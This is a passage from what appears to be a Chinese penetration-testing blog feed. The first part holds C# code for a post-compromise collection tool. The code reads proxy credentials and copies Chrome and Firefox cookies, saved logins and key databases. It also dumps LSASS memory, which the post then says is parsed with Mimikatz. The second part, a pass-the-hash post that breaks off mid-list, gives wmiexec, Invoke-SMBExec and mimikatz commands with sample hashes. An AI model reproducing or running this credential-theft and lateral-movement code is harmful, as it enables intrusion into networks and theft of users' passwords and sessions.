class="title">StartInfo</span>.<span class="title">UseShellExecute</span> = <span class="title">false</span></span>; <span class="comment">// 是否使用操作系统shell启动</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">CreateNoWindow</span> = <span class="title">true</span></span>; <span class="comment">// 不显示程序窗口</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Start</span><span class="params">()</span></span>; <span class="comment">// 启动程序</span></span><br><span class="line">                <span class="keyword">string</span> outlist = <span class="function"><span class="keyword">proc</span>.<span class="title">StandardOutput</span>.<span class="title">ReadToEnd</span><span class="params">()</span></span>;</span><br><span class="line">                TxtWriter(outlist, FileName);</span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">WaitForExit</span><span class="params">()</span></span>; <span class="comment">// 等待程序执行完退出进程</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="5-程序安装及版本"><a href="#5-程序安装及版本" class="headerlink" title="5) 程序安装及版本"></a>5) 程序安装及版本</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找安装程序及版本</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetInstalledApplications</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 从注册 Uninstall 表项中提取相关信息，进行筛选</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> basekey = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"</span>;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123; <span class="comment">// This key exists</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"DisplayName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> displayversion = (installedapp.GetValue(<span class="string">"DisplayVersion"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayVersion"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> helplink = (installedapp.GetValue(<span class="string">"HelpLink"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"HelpLink"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!(Regex.IsMatch(displayname, <span class="string">"^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for"</span>) &amp;&amp; Regex.IsMatch(helplink, <span class="string">"support\\.microsoft"</span>)) &amp;&amp; displayname != <span class="string">""</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (displayversion != <span class="string">""</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname + " (" + displayversion + ")");</span></span><br><span class="line">                                <span class="keyword">string</span> displaynameversion = displayname + <span class="string">" ("</span> + displayversion + <span class="string">")"</span>;</span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            basekey = <span class="string">"Software\\Microsoft\\Installer\\Products"</span>;</span><br><span class="line">            registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"ProductName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"ProductName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">if</span> (displayname != <span class="string">""</span>)</span><br><span class="line">                            <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                            TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="6-最近浏览的文件"><a href="#6-最近浏览的文件" class="headerlink" title="6) 最近浏览的文件"></a>6) 最近浏览的文件</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Recent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 最近预览的文件</span></span><br><span class="line"><span class="comment">             * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址</span></span><br><span class="line"><span class="comment">             * - 参考：https://www.t00ls.net/articles-46152.html</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);</span><br><span class="line">            <span class="keyword">string</span> recents = <span class="string">@"Microsoft\Windows\Recent"</span>;</span><br><span class="line">            <span class="keyword">string</span> recentsPath = Path.Combine(userPath, recents);</span><br><span class="line">            DirectoryInfo di = <span class="keyword">new</span> DirectoryInfo(recentsPath);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Recent Items in " + recentsPath);</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> file <span class="keyword">in</span> di.GetFiles())</span><br><span class="line">            &#123;</span><br><span class="line">                TxtWriter(file.Name, <span class="string">"最近预览的文件"</span>);</span><br><span class="line">                <span class="comment">//Console.WriteLine("\t[*] " + file.Name);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="7-网络代理信息"><a href="#7-网络代理信息" class="headerlink" title="7) 网络代理信息"></a>7) 网络代理信息</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetProxyInformation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理</span></span><br><span class="line"><span class="comment">             * - 使用代理访问 google.com 进行确认</span></span><br><span class="line"><span class="comment">             * - 如果存在验证情况，则将相关信息进行输出</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            IWebProxy wp = WebRequest.GetSystemWebProxy();</span><br><span class="line">            <span class="keyword">string</span> url = <span class="string">"https://www.google.com"</span>;</span><br><span class="line">            Uri req = <span class="keyword">new</span> Uri(url);</span><br><span class="line">            <span class="comment">//Console.Out.WriteLine("[+] URL Requested: " + req.AbsoluteUri);</span></span><br><span class="line">            Uri proxy = wp.GetProxy(req);</span><br><span class="line">            <span class="keyword">if</span> (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//Console.Out.WriteLine("\t[*] Proxy: DIRECT");</span></span><br><span class="line">                TxtWriter(proxy.AbsoluteUri, <span class="string">"网络代理情况"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (wp.Credentials != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                NetworkCredential cred = wp.Credentials.GetCredential(req, <span class="string">"basic"</span>);</span><br><span class="line">                <span class="keyword">string</span>[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> cers <span class="keyword">in</span> cerd)</span><br><span class="line">                &#123;</span><br><span class="line">                    TxtWriter(cers, <span class="string">"网络代理情况"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="8-浏览器相关文件"><a href="#8-浏览器相关文件" class="headerlink" title="8) 浏览器相关文件"></a>8) 浏览器相关文件</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Chrome 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> ChromeLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> ChromeBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Local\\Google\\Chrome"</span>, localAppData);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(ChromeBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Chrome 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span> ChromeHistoryPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\History"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeBookmarkPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Bookmarks"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeCookiesPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Cookies"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeLoginDataPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Login Data"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span>[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;;</span><br><span class="line">                <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Chrome"</span>);</span><br><span class="line">                foreach (<span class="keyword">string</span> filePath in ChromePaths)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                    &#123;</span><br><span class="line">                        var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                        <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Chrome Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 Friefox 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> FroefoxLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取 Friefox 浏览器目录</span></span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> FirefoxBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"</span>, localAppData);</span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(FirefoxBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Friefox 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span>[] directories = Directory.GetDirectories(FirefoxBasePath);</span><br><span class="line">                foreach (<span class="keyword">string</span> directory in directories)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> FirefoxPlaces = <span class="keyword">string</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"places.sqlite"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert8.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert9.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key3.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key4.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxLogon = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"logins.json"</span>);</span><br><span class="line">                    <span class="keyword">string</span>[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;;</span><br><span class="line">                    <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                    <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Friefox"</span>);</span><br><span class="line">                    foreach (<span class="keyword">string</span> filePath in FirefoxPaths)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                        &#123;</span><br><span class="line">                            var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                            <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Friefox Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="9-MiniDump"><a href="#9-MiniDump" class="headerlink" title="9) MiniDump"></a>9) MiniDump</h3><p>直接取用<code>SharpDump</code>，需要高权限</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">"dbghelp.dll"</span>, EntryPoint = <span class="meta-string">"MiniDumpWriteDump"</span>, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)</span>]</span><br><span class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">MiniDumpWriteDump</span>(<span class="params">IntPtr hProcess, <span class="keyword">uint</span> processId, SafeHandle hFile, <span class="keyword">uint</span> dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Minidump</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>      &#123;</span><br><span class="line">          IntPtr targetProcessHandle = IntPtr.Zero;</span><br><span class="line">          <span class="keyword">uint</span> targetProcessId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          Process targetProcess = <span class="literal">null</span>;</span><br><span class="line">          Process[] processes = Process.GetProcessesByName(<span class="string">"lsass"</span>);</span><br><span class="line">          targetProcess = processes[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span></span><br><span class="line">          &#123;</span><br><span class="line">              targetProcessId = (<span class="keyword">uint</span>)targetProcess.Id;</span><br><span class="line">              targetProcessHandle = targetProcess.Handle;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">          &#123;</span><br><span class="line">              Console.WriteLine(String.Format(<span class="string">"\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n"</span>, targetProcess.ProcessName, targetProcess.Id, ex.Message));</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">bool</span> bRet = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">string</span> dumpDir = Program.CreateDirectory();</span><br><span class="line">          <span class="keyword">string</span> dumpFile = String.Format(<span class="string">"&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp"</span>, dumpDir, targetProcessId);</span><br><span class="line">          <span class="comment">//string zipFile = String.Format("&#123;0&#125;\\lsass_pid&#123;1&#125;.bin", dumpDir, targetProcessId);</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">//Console.WriteLine(String.Format("\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;", targetProcess.ProcessName, targetProcess.Id, dumpFile));</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">using</span> (FileStream fs = <span class="keyword">new</span> FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))</span><br><span class="line">          &#123;</span><br><span class="line">              bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (<span class="keyword">uint</span>)<span class="number">2</span>, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="10-文件夹压缩加密"><a href="#10-文件夹压缩加密" class="headerlink" title="10) 文件夹压缩加密"></a>10) 文件夹压缩加密</h3><p><code>AES</code> 加密</p><h2 id="0x02-信息解析模块"><a href="#0x02-信息解析模块" class="headerlink" title="0x02 信息解析模块"></a>0x02 信息解析模块</h2><p> 本文所缺失的相关代码，下步更新放出。</p><h3 id="1-压缩包解密"><a href="#1-压缩包解密" class="headerlink" title="1) 压缩包解密"></a>1) 压缩包解密</h3><p><code>AES</code> 解密</p><h3 id="2-MiniDump"><a href="#2-MiniDump" class="headerlink" title="2) MiniDump"></a>2) MiniDump</h3><p>利用 <code>subtee</code> 的 <code>PELoader</code> 加载 <code>Mimikatz</code> 的自定义版本，加载 <code>minidump</code> 文件，运行 <code>sekurlsa :: logonpasswords</code> 和 <code>sekurlsa::ekeys</code></p><h3 id="3-浏览器相关"><a href="#3-浏览器相关" class="headerlink" title="3) 浏览器相关"></a>3) 浏览器相关</h3><p>解析相关 <code>sqlite</code> 文件</p><p>解析密码文件</p><h2 id="0x03-整合的相关项目列表"><a href="#0x03-整合的相关项目列表" class="headerlink" title="0x03 整合的相关项目列表"></a>0x03 整合的相关项目列表</h2><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna" target="_blank" rel="noopener">AVQuery.cna</a></p><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna" target="_blank" rel="noopener">EDR.cna</a></p><p><a href="https://github.com/secgroundzero/SharpAttack" target="_blank" rel="noopener">SharpAttack</a></p><p><a href="https://github.com/GhostPack/SafetyKatz" target="_blank" rel="noopener">SafetyKatz</a></p><p>这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】Pass The Hash</title>
    <link href="https://rcoil.me/2019/04/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Pass%20The%20Hash/"/>
    <id>https://rcoil.me/2019/04/【知识回顾】Pass The Hash/</id>
    <published>2019-04-04T03:14:38.000Z</published>
    <updated>2019-10-31T15:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。</p><h1 id="0x01-【知识回顾】Pass-The-Hash的原理"><a href="#0x01-【知识回顾】Pass-The-Hash的原理" class="headerlink" title="0x01  【知识回顾】Pass The Hash的原理"></a>0x01  【知识回顾】Pass The Hash的原理</h1><ul><li>在windows系统中，通常会使用<code>NTLM身份认证</code>。</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。</li><li>这个不是漏洞。</li></ul><h1 id="0x02-常用攻击方式"><a href="#0x02-常用攻击方式" class="headerlink" title="0x02 常用攻击方式"></a>0x02 常用攻击方式</h1><ul><li><p><strong>meterpreter</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">psexec_psh</span></span><br></pre></td></tr></table></figure></li><li><p><strong>wmiexec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@<span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-WMIExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-SMBExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>mimikatz</strong>（Overpass-the-hash）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:john /domain:rcoil.org /ntlm:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5</span><br></pre></td></tr></table></figure></li><li><p><strong>CrackMapExec</strong></p><figure 